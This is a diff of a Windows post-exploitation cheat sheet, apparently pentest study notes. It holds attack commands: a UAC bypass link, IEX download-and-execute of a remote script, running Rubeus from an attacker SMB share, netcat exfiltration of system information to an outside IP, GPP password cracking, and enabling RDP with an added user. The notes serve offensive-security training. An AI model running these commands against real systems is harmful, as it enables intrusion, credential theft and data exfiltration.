@@ -57,9 +57,10 @@ Powerview is extremely useful to simplify your work with powershell:
 
 ## UAC
 
-* check for UAC in PS: `(Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).EnableLUA`
+
 * check UAC in cmd: `REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`
-* UAC can be bypassed using binary exploits
+* UAC can be bypassed using https://github.com/turbo/zero2hero
+OR 
 
 # Antivirus
 
@@ -71,6 +72,7 @@ Powerview is extremely useful to simplify your work with powershell:
 ## Download and Upload stuff
 
 
+
 ```powershell
 
 # enable SMBv1
@@ -78,6 +80,25 @@ Powerview is extremely useful to simplify your work with powershell:
 # on compromised machine
 
 Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All
+
+New-SmbMapping -RemotePath '\\server' -Username "domain\username" -Password "password"
+
+#copy
+
+copy share_path target_dir
+
+#example 
+
+copy c:\test '\\192.168.219.100\share_name'
+
+# use
+
+net use \\server /user:domain\username password
+
+#execute PEs
+
+ & \\192.168.119.169\tools\Rubeus.exe triage
+
 
 ```
 
@@ -91,29 +112,9 @@ Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All
 
 or just `IEX(New-Object Net.WebClient).DownloadString('URL')`
 
+use netcat
 
-
-```
-
-New-SmbMapping -RemotePath '\\server' -Username "domain\username" -Password "password"
-
-#copy
-
-copy share_path target_dir
-
-#example 
-
-copy c:\test '\\192.168.219.100\share_name'
-
-```
-* use in cmd
-```
-net use \\server /user:domain\username password
-```
-
-Netcat
-
-`PS> cmd.exe /C "nc64.exe 192.168.219.137 443 < systeminfo.txt"`
+`cmd.exe /C "nc64.exe 192.168.219.137 443 < systeminfo.txt"`
 
 * Powershell
 ```
@@ -685,6 +686,7 @@ This shell works even on Windows 11 but needs MSF
 
 # Escalation
 
+
 ## Kernel exploits
 
 see https://github.com/jonnyzar/windows-kernel-exploits
@@ -700,9 +702,9 @@ see https://github.com/jonnyzar/windows-kernel-exploits
 
 ## Exposed GPP Password
 
-* Article to read: https://grimhacker.com/2015/04/10/gp3finder-group-policy-preference-password-finder/
-* Use gp3finder tool once .xml file with cpassword is found
-`docker run grimhacker/gp3finder -D edBSHOw...`
+* impacket-Get-GPPPassword to get password
+* gp3finder.py to crack password
+
 
 ## Compiling Exploits for Windows on Kali
 
@@ -730,7 +732,7 @@ Or connect as other service if needed from victim
 ```
 
 * look for stuff
-`Get-Childitem –Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`
+`Get-Childitem -Path C:\ -Include *.txt -File -Recurse -ErrorAction SilentlyContinue`
 
 * enable RDP
 `reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f`
@@ -744,6 +746,9 @@ Or connect as other service if needed from victim
 * add to RDP group
 
 `powershell -nop -c "Add-LocalGroupMember -Group "Remote Desktop Users" -Member "Pentester""`
+
+`net localgroup "Remote Desktop Users" Pentester /add`
+
 
 ## Use winexe
 
